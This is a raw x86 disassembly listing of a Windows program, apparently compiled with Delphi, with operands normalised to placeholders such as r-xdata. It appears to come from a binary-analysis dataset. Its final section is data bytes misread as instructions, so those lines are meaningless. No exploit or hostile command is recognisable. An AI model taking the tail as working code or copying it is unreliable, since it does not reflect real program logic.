mov eax [ eax + 0xac ]
call sub_414598
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_414170
mov edi eax
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x5c ]
inc esi
dec ebx
jne r-xdata
sub_466ac7
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa4 ]
cdq
idiv [ rw-data ]
mov ebx eax
test ebx ebx
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45d3f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_464fa4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466b4f
lea eax [ ebp - 0x10 ]
call sub_404050
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
dec ebx
jne r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_466b58
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x6c ]
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4651c4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x80 ] 0x1
sub_466ba8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_463320
mov eax [ ebp + 0x8 ]
mov [ edi + 0x68 ] eax
mov [ edi + 0x6c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_466bf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403848#9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_466d68
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x88 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_466b58
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x68 ] eax
mov edx ebx
call sub_4618f8
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov esi [ ebx + 0x98 ]
test esi esi
jle r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d19c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0xac ]
mov edx [ ebp - 0xc ]
call sub_4144ac
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx esi
mov eax [ ebx + 0xac ]
call sub_464fa4
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_466b58
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_414548
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x94 ]
mov eax [ ebp - 0x8 ]
call sub_4622f4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x58 ]
lea eax [ ebp - 0xc ]
call sub_40d19c
jmp r-xdata
sub_466d44
call sub_40d19c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_4665a4
call sub_403a84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466d68
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_461008
mov [ edi + 0xb8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_466dac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_40371c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_4618e4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_466dfa
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf ] 0x1
call sub_403a30
call sub_403a84
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_4618e4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_466e74
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_463568
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ eax + 0xb8 ]
test edx edx
je r-xdata
lea eax [ ebx + 0x68 ]
call sub_40d19c
mov esi edx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
mov eax esi
call sub_466b58
test eax eax
je r-xdata
mov edx ebx
call sub_414548
mov eax esi
call sub_466b58
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_466ec8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46703a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_466ff2
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_403848#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467041
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_466f6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_466410
mov eax [ ebx + 0xc ]
add eax 0xffffd8bb
sub eax 0x2
jae r-xdata
call sub_403a84
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467041
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_466fb5
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_466410
call sub_403a84
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467041
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_467054
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ r-xdata ]
push eax
mov ecx esi
xor edx edx
mov eax edi
call sub_4151a0
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4670b8
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4673d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_404050
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_407ddc
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4673dc
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4675e4
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_4673ab
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
add eax 0x10
mov edx ebx
call sub_4040a4
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x14 ]
add eax 0x20
mov edx [ ebp - 0x10 ]
call sub_4040a4
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404310
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_404570
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
call sub_407ddc
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404310
mov edx eax
inc edx
mov ecx 0x7fffffff
mov eax ebx
call sub_404570
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404310
mov ecx eax
inc ecx
mov edx 0x1
mov eax ebx
call sub_404570
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0xc ]
call sub_404238
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x1c ]
call sub_40435c
mov edx [ ebp - 0x1c ]
pop eax
call sub_407ddc
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404310
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
mov eax ebx
call sub_404570
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor ecx ecx
push ebp
push j_sub_403848#2
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0x28 ]
cmp bl 0x20
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_404238
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_464e2c
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx r-xdata
mov eax [ ebp - 0x10 ]
call sub_464d48
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_4676a0
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_462350
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403294
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_462350
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_4672ad
add [ eax ] eax
add [ eax ] al
je r-xdata
inc eax
add [ ecx - 0x74ffb98e ] bh
push ebp
in al dx
cmp [ edx + 0xc ] 0x0
je r-xdata
call sub_403a30
call sub_403a84
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x2c ]
test edx edx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_4676a0
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov edx [ edx + 0xf0 ]
test edx edx
jle r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_460374
mov eax [ ebp - 0x14 ]
call sub_4676a0
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_462350
jmp r-xdata
call sub_403a30
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_460374
mov eax [ ebp - 0x14 ]
call sub_4676a0
jmp r-xdata
call sub_403a84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403294
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_462350
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_4673eb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4674af
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_414ac4
mov [ esi + 0xc ] 0x20
mov [ esi + 0x19 ] 0x1
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x8 ]
call sub_407f48
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x108 ]
mov eax [ esi ]
call sub_4031e4
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4042b4
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x1c ]
pop ecx
call sub_40435c
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x29 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x34 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4674b6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
add esp 0xfffffff0
call sub_4035a0
sub_4674d4
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x34 ]
call sub_40d19c
lea eax [ esi + 0x30 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414afc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_467520
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46759d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_414b90
mov eax [ ebx + 0x4 ]
call sub_4670ac
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403490
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4043d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4675a4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_4675af
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_4040a4
mov edx esi
mov eax ebx
call sub_414c70
pop esi
pop ebx
retn
sub_4675e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x18 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_467648
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d19c
lea eax [ esi + 0x18 ]
call sub_40d19c
lea eax [ esi + 0x8 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4676a1
mov ebx eax
mov [ ebx + 0xc ] 0x0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x9c ]
mov edx [ ebx + 0x14 ]
call sub_46045c
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx [ ebx + 0x14 ]
call sub_4622f4
pop ebx
retn
sub_4676d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4676f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4676fc
retn
sub_4678d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + 0x46 ] bh
add [ ecx + edi * 2 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x79 ] bl
inc esi
add [ eax + eax ] ah
add [ eax ] al
clc
sbb eax [ ecx ]
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add al ah
mov [ esi ] al
pop eax
dec eax
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0x64000000 ] al
outsd
inc eax
add [ eax + eax ] al
add [ eax ] al
outsd
inc eax
add [ eax ] cl
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] ah
add [ eax + eax ] cl
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sbb al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
jb r-xdata
imul ebp [ edi + 0x6e ] 0x46796c73
add [ edi ] al
or eax 0x53644954
push ebx
dec esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65560a00
inc esi
imul ebp [ ebp + 0x64 ] 0xc00406f
add [ eax ] al
dec [ eax + eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4b070002 ] al
imul ebp [ edi + 0x6e ] 0x46791c73
add [ esp + ebx + 0x41 ] ch
add [ ecx ] cl
add [ ecx + ecx * 2 ] cl
push ebx
push ebx
dec esp
dec edi
jo r-xdata
or [ eax ] al
or al [ ebx + 0x69 ]
jo r-xdata
jns r-xdata
add [ eax ] bl
add [ eax ] al
[ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560a0005 ] al
jb r-xdata
imul ebp [ ebp + 0x8 ] 0x10004677
add [ eax ] al
call [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060003 ] al
je r-xdata
pop es
add [ eax ] al
add [ edx ] 0x0
outsb
push ebx
push ebx
dec esp
or [ eax ] eax
outsd
inc eax
add [ eax + eax ] al
add bh bh
add al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al 0x52
outsd
outsd
je r-xdata
adc [ eax ] al
or al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
sbb al 0x0
jb r-xdata
jae r-xdata
outsd
push esp
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
jo r-xdata
outsd
pushad
ja r-xdata
dec ebx
add [ edi ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x467c ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0xb40046 ] al
js r-xdata
inc eax
add [ eax + edx * 4 ] ch
imul esi [ ebx + 0x74 ] 0x2400408d
jpo r-xdata
jb r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add [ eax ] al
mov eax 0xc4004010
push r-xdata
sbb al 0x0
add bh bh
sbb al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ edx ] cl
push esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx ] cl
push esi
jb r-xdata
add [ eax ] al
call [ eax + eax ]
add [ ecx ] dl
add [ eax ] al
call [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d040004 ] al
outsd
sbb al 0x78
inc esi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x4d
inc esi
imul ebp [ ebp + 0x64 ] 0x800406f
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43080001 ] al
jb r-xdata
add [ eax ] al
xchg esp eax
inc esi
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] cl
mov [ esi ] es
push eax
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 + 0x2e1c0041 ] dl
inc esi
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ebx + ecx * 4 - 0x200bffba ] dh
inc ebp
add [ eax ] ch
inc ebp
add [ eax + 0x45 ] bl
add [ eax - 0x73 ] ah
inc esi
add al ch
mov [ esi ] es
push esp
mov [ esi ] es
mov esp 0x1000462b
lea eax [ esi ]
cmp al 0x2c
inc esi
add [ eax ] bl
lea eax [ esi ]
xor [ ebp - 0x70abffba ] cl
inc esi
add [ esi + ecx * 4 + 0x46 ] bh
add al bl
mov es [ esi ]
hlt
